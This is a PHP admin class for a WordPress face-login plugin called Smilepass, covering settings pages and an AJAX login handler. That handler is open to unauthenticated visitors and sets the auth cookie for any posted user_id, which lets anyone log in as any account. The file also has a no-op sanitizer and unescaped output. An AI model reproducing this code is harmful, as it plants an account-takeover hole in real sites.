<?php

class Smilepass_Admin {

    private static $initiated = false;
    
    public static function init(){
        if(!self::$initiated){
            self::init_hooks();
        }
    }
    
    private static function init_hooks(){
        self::$initiated = true;
        
        wp_enqueue_script( 'modernizr.js', plugins_url( 'js/modernizr.js', __FILE__ ));
        //wp_enqueue_style( 'smilepass.css', plugins_url( 'css/smilepass.css', __FILE__ ));
        //add_action( 'login_head',  array( 'Smilepass', 'render_camera_box') );
        
        add_filter( 'plugin_action_links_'.plugin_basename( plugin_dir_path( __FILE__ ) . 'smilepass.php'), array( 'Smilepass_Admin', 'add_settings_link') ); 
        add_action( 'admin_menu', array( 'Smilepass_Admin', 'admin_menu' ) );
        add_action( 'admin_init', array( 'Smilepass_Admin', 'admin_init' ) );

        add_action('wp_ajax_smilepass_login_action', array('Smilepass_Admin','smilepass_login_action'));                  
        add_action('wp_ajax_nopriv_smilepass_login_action', array('Smilepass_Admin','smilepass_login_action'));       
        
    }

    public static function smilepass_login_action(){
        if($_POST['operation'] == 'login' ){
            $face_login_deprecated = get_user_meta($_POST['user_id'], 'face_login_deprecated', true);
            if($face_login_deprecated == 1){
                print 0;
                wp_die();
            }
            else{        
                $user = get_user_by('id', $_POST['user_id'] );
    
                if ( !is_wp_error( $user ) ){
                    
                    print 1;
                    wp_die();
                }
                else{
                    print 0;
                    wp_die();
                }
            }
        }
        if($_POST['operation'] == 'login-checked' ){
            $user = get_user_by('id', $_POST['user_id'] );

            if ( !is_wp_error( $user ) ){
                wp_clear_auth_cookie();
                wp_set_current_user ( $user->ID );
                wp_set_auth_cookie  ( $user->ID );
                
                print 1;
                wp_die();
            }
            else{
                print 0;
                wp_die();
            }
        }
    }
    
    public static function add_settings_link( $links ) {
        $settings_link = '<a href="' . admin_url('/options-general.php?page=smilepass-admin') . '">Settings</a>';
        array_push( $links, $settings_link );
        return $links;
    }

    public static function admin_menu() {
        
        global $current_user;
        get_currentuserinfo();
        
        if(isset($current_user->caps['administrator'])){
            add_options_page( 'Smilepass administrator options', 'Smilepass plugin global settings', 'administrator', 'smilepass-admin', array( 'Smilepass_Admin', 'render_administrator_options' ) );
            add_options_page( 'Smilepass subscriber options', 'Smilepass plugin user settings', 'administrator', 'smilepass', array( 'Smilepass_Admin', 'render_subscriber_options' ) );
        }
        else{
            add_options_page( 'Smilepass subscriber options', 'Smilepass plugin', 'subscriber', 'smilepass', array( 'Smilepass_Admin', 'render_subscriber_options' ) );
        }        
    }   
    
    public static function add_to_option($option, $new_data){
        $old_data = get_option($option);
        if(!$old_data){
            add_option($option, $new_data);
        }
        else{
            $data = array_merge($old_data, $new_data);
            update_option($option, $data);
        }
    }
    
    public static function render_administrator_options() {
        
        if(!empty($_POST)){
            if(isset($_POST['action']) && $_POST['action'] == 'login'){
                $params = 'email='.$_POST['email'].'&password='.$_POST['password'];    
            }
            elseif(isset($_POST['action']) && $_POST['action'] == 'register'){
                $params = 'email='.$_POST['email'].'&password='.$_POST['password'].'&confirm_password='.$_POST['confirm_password'];    
            }
            $curl = curl_init();
            curl_setopt($curl, CURLOPT_URL, 'https://subscriber.smile-pass.com/plugin/authorize');
            curl_setopt($curl, CURLOPT_RETURNTRANSFER,true);
            curl_setopt($curl, CURLOPT_POST, true);
            curl_setopt($curl, CURLOPT_POSTFIELDS, $params);
            $json = curl_exec($curl);
            curl_close($curl);
            
            $authentication = json_decode($json);
            
            if($authentication->success == 1){
                self::add_to_option('smilepass-admin', array(
                                                            'email'=>$_POST['email'], 
                                                            'namespace'=>$_POST['namespace'], 
                                                            'api_url'=>$_POST['api_url'], 
                                                            'api_key'=>$authentication->api_key, 
                                                            'api_secret'=>$authentication->api_secret,
                                                            'face_params' => array(
                                                                'Glasses' => array(),
                                                                'Dark glasses' => array(),
                                                                'Blink' => array(),
                                                                'Gender' => array(),
                                                                'Mouth open' => array(),                                                            ),
                                                        ));
                
                $msg_type = 'updated'; 
                $message = $authentication->message;
            }
            else{
                $msg_type = 'error'; 
                $message = $authentication->message;
            }
        }
        //add_option('smilepass-admin', array ( 'namespace' => '071d2b238ca1b889f4524f5c1e33037c' ));
        //delete_option('smilepass-admin');
        //print_r(get_option('smilepass-admin'));
?>
        <div class="wrap">
            <h2>Smilepass administrator options</h2>
            
            <?php $option = get_option('smilepass-admin'); ?>
            <?php if(isset($option['api_key']) && isset($option['api_secret']) && !empty($option['api_key']) && !empty($option['api_secret'])): ?>
                <div class="updated notice is-dismissible"><p>Plugin active.</p></div>
            <?php else: ?>
                <div class="error notice is-dismissible"><p>Plugin not activated. To activate the plugin, login or register.</p></div>
            <?php endif; ?>
            
            <?php if(isset($authentication)): ?>
                <div class="<?php print $msg_type; ?> notice is-dismissible"><p><?php print $message; ?></p></div>
            <?php endif; ?>
            
            <form action="" method="POST">
                <?php settings_fields( 'smilepass-login' ); ?>
                <?php do_settings_sections( 'smilepass-login' ); ?>
                <input type="hidden" name="action" value="login">
                <?php submit_button(); ?>
            </form>
            
            <form action="" method="POST">
                <?php settings_fields( 'smilepass-register' ); ?>
                <?php do_settings_sections( 'smilepass-register' ); ?>
                <input type="hidden" name="action" value="register">
                <?php submit_button(); ?>
            </form>
            
            <form action="options.php" method="POST">
                <?php settings_fields( 'smilepass-admin' ); ?>
                <?php do_settings_sections( 'smilepass-admin' ); ?>
                <?php submit_button(); ?>
            </form>
        </div>
<?php
    }
     
    public static function render_subscriber_options() {
?>
        <div class="wrap">
            <h2>Selfie authentication settings</h2>
            <div class="card">
            <h2>Activation</h2>
            <p>In order to activate a selfie authentication (Log In with Selfie) functionality, please go through the enrolment process by making 4 snapshots of your face and pressing a “Save” button. 
After that, you will be able to Log In with your selfie :) </p>
            </div>
            <?php do_settings_sections( 'smilepass-camera-box' ); ?>
            
        </div>
<?php
    }

    public static function admin_init() {

        register_setting( 'smilepass', 'smilepass', array( 'Smilepass_Admin', 'sanitize' ) );
        register_setting( 'smilepass-admin', 'smilepass-admin', array( 'Smilepass_Admin', 'sanitize' ) );
        register_setting( 'smilepass-login', 'smilepass-login', array( 'Smilepass_Admin', 'sanitize' ) );
        register_setting( 'smilepass-register', 'smilepass-register', array( 'Smilepass_Admin', 'sanitize' ) );
        
        ///////////////////////////////////////////////////////////////////////////////
        //////////////////////////////// USER FIELDS //////////////////////////////////
        ///////////////////////////////////////////////////////////////////////////////
        
        add_settings_section( 'smilepass_camera_box', '', array( 'Smilepass_Admin','render_camera_box'), 'smilepass-camera-box' );
        
        ///////////////////////////////////////////////////////////////////////////////
        //////////////////////////////// ADMIN FIELDS /////////////////////////////////
        ///////////////////////////////////////////////////////////////////////////////
        
        $keys_section_title = 'Authorization';
        add_settings_section( 'login_data', $keys_section_title, '', 'smilepass-login' );     
        
        $key_title = 'SmilePass Email';
        add_settings_field( 'email', $key_title, array( 'Smilepass_Admin', 'render_field_email' ), 'smilepass-login', 'login_data' );
        
        $key_title = 'SmilePass Password';
        add_settings_field( 'password', $key_title, array( 'Smilepass_Admin', 'render_field_password' ), 'smilepass-login', 'login_data' );
        
        $api_url_title =  'API URL'; 
        add_settings_field( 'api_url', $api_url_title, array( 'Smilepass_Admin', 'render_field_api_url' ), 'smilepass-login', 'login_data' );
        
        $namespace_title =  'Namespace'; 
        add_settings_field( 'namespace', $namespace_title, array( 'Smilepass_Admin', 'render_field_namespace' ), 'smilepass-login', 'login_data' );
        
        ////////////////////////////////////////////////////////////////////////////////////////////////////
        
        $keys_section_title = 'Registration';
        add_settings_section( 'register_data', $keys_section_title, '', 'smilepass-register' );     
        
        $key_title = 'SmilePass Email';
        add_settings_field( 'email', $key_title, array( 'Smilepass_Admin', 'render_field_email' ), 'smilepass-register', 'register_data' );
        
        $key_title = 'SmilePass Password';
        add_settings_field( 'password', $key_title, array( 'Smilepass_Admin', 'render_field_password' ), 'smilepass-register', 'register_data' );
        
        $key_title = 'SmilePass Confirm Password';
        add_settings_field( 'confirm_password', $key_title, array( 'Smilepass_Admin', 'render_field_confirm_password' ), 'smilepass-register', 'register_data' );
        
        $api_url_title =  'API URL'; 
        add_settings_field( 'api_url',$api_url_title, array( 'Smilepass_Admin', 'render_field_api_url' ), 'smilepass-register', 'register_data' );
        
        $namespace_title =  'Namespace';
        add_settings_field( 'namespace', $namespace_title, array( 'Smilepass_Admin', 'render_field_namespace' ), 'smilepass-register', 'register_data' );
        
        ///////////////////////////////////////////////////////////////////////////////
        
        $forms_section_title = 'Served Forms';
        add_settings_section( 'served-forms', $forms_section_title, '', 'smilepass-admin', 'served-forms' ); 
        
        $forms_login_form_title =  'Login form'; 
        add_settings_field( 'login_form',$forms_login_form_title, array( 'Smilepass_Admin', 'render_field_login_form' ), 'smilepass-admin', 'served-forms' );
        
        $forms_number_of_photos_title =  'Number of photos for enrollment'; 
        add_settings_field( 'number_of_photos', $forms_number_of_photos_title, array( 'Smilepass_Admin', 'render_field_number_of_photos' ), 'smilepass-admin', 'served-forms' );
        
        $forms_min_number_of_matches_title =  'Minimal number of matches for recognize'; 
        add_settings_field( 'min_number_of_matches', $forms_min_number_of_matches_title, array( 'Smilepass_Admin', 'render_field_min_number_of_matches' ), 'smilepass-admin', 'served-forms' );

        $forms_max_number_of_login_photos_title =  'Expand the number of enrollments for login form to 4 (Default 1)'; 
        add_settings_field( 'max_number_of_login_photos', $forms_max_number_of_login_photos_title, array( 'Smilepass_Admin', 'render_field_max_number_of_login_photos' ), 'smilepass-admin', 'served-forms' );

        add_settings_field( 'email', '', array( 'Smilepass_Admin', 'render_field_copy_email' ), 'smilepass-admin', 'served-forms' );
        add_settings_field( 'api_url', '', array( 'Smilepass_Admin', 'render_field_copy_api_url' ), 'smilepass-admin', 'served-forms' );
        add_settings_field( 'api_key', '', array( 'Smilepass_Admin', 'render_field_copy_api_key' ), 'smilepass-admin', 'served-forms' );
        add_settings_field( 'api_secret', '', array( 'Smilepass_Admin', 'render_field_copy_api_secret' ), 'smilepass-admin', 'served-forms' );
        add_settings_field( 'namespace', '', array( 'Smilepass_Admin', 'render_field_copy_namespace' ), 'smilepass-admin', 'served-forms' );
    }

    public static function sanitize( $input ) { //do nothing for now
        return $input;
    }
        
    ///////////////////////////////////////////////////////////////////////////////
    //////////////////////////////// USER STAFF /////////////////////////////////
    ///////////////////////////////////////////////////////////////////////////////
    
    public static function render_camera_box() {
        print Smilepass::render_camera_box();
    }
        
    ///////////////////////////////////////////////////////////////////////////////
    //////////////////////////////// ADMIN FIELDS /////////////////////////////////
    ///////////////////////////////////////////////////////////////////////////////

    public static function render_field_email() {
        $option = get_option('smilepass-admin'); 
        ?><input name="email" type="text" style="max-width:350px;width:100%;"  value="<?php echo $option['email']; ?>" /><?php
    }

    public static function render_field_password() {
        ?><input name="password" type="text" style="max-width:350px;width:100%;"  value="" /><?php
    }

    public static function render_field_confirm_password() {
        ?><input name="confirm_password" type="text" style="max-width:350px;width:100%;"  value="" /><?php
    }
    
    public static function render_field_api_url() {
        $option = get_option('smilepass-admin');
        if(!$option || !isset($option['api_url']) || empty($option['api_url'])){
            $api_url = 'https://ln.smile-pass.com/fc/';
        }
        else{
            $api_url = $option['api_url'];
        }
        ?><input name="api_url" READONLY type="text" style="max-width:350px;width:100%;" value="<?php echo $api_url;?>" /><?php
    }   
    
    public static function render_field_namespace() {
        $option = get_option('smilepass-admin');
        if(!$option || !isset($option['namespace']) || empty($option['namespace'])){
            $namespace = md5($_SERVER['HTTP_HOST']);
        }
        else{
            $namespace = $option['namespace'];
        }
        ?><input name="namespace" READONLY type="text" style="max-width:350px;width:100%;" value="<?php echo $namespace;?>" /><?php
    }   
    
    ///////////////////////////////////////////////////////////////////////////////
    
    public static function render_field_login_form() {
        $option = get_option('smilepass-admin'); 
        ?><input name="smilepass-admin[login_form]" type="checkbox"  <?php checked( 1, $option['login_form'] ) ?> value="1" /><?php
    }   
    
    public static function render_field_number_of_photos() {
        $option = get_option('smilepass-admin'); 
        ?><input name="smilepass-admin[number_of_photos]" type="text"  value="<?php print($option['number_of_photos'] ? $option['number_of_photos'] : 0); ?>" /><?php
    }
    
    public static function render_field_min_number_of_matches() {
        $option = get_option('smilepass-admin'); 
        ?><input name="smilepass-admin[min_number_of_matches]" type="text"  value="<?php print($option['min_number_of_matches'] ? $option['min_number_of_matches'] : 0); ?>" /><?php
    }
    
    public static function render_field_max_number_of_login_photos() {
        $option = get_option('smilepass-admin'); 
        ?><input name="smilepass-admin[max_number_of_login_photos]" type="checkbox"  value="4" <?php print(isset($option['max_number_of_login_photos']) && $option['max_number_of_login_photos'] > 1 ? 'checked' : 0); ?> /><?php
    }
    
    public static function render_field_copy_email() {
        $option = get_option('smilepass-admin'); 
        ?><input type="hidden" name="smilepass-admin[email]" value="<?php print $option['email']; ?>"><?php
    }
    public static function render_field_copy_api_url() {
        $option = get_option('smilepass-admin'); 
        ?><input type="hidden" name="smilepass-admin[api_url]" value="<?php print $option['api_url']; ?>"><?php
    }
    public static function render_field_copy_api_key() {
        $option = get_option('smilepass-admin'); 
        ?><input type="hidden" name="smilepass-admin[api_key]" value="<?php print $option['api_key']; ?>"><?php
    }
    public static function render_field_copy_api_secret() {
        $option = get_option('smilepass-admin'); 
        ?><input type="hidden" name="smilepass-admin[api_secret]" value="<?php print $option['api_secret']; ?>"><?php
    }
    public static function render_field_copy_namespace() {
        $option = get_option('smilepass-admin'); 
        ?><input type="hidden" name="smilepass-admin[namespace]" value="<?php print $option['namespace']; ?>"><?php
    }
}

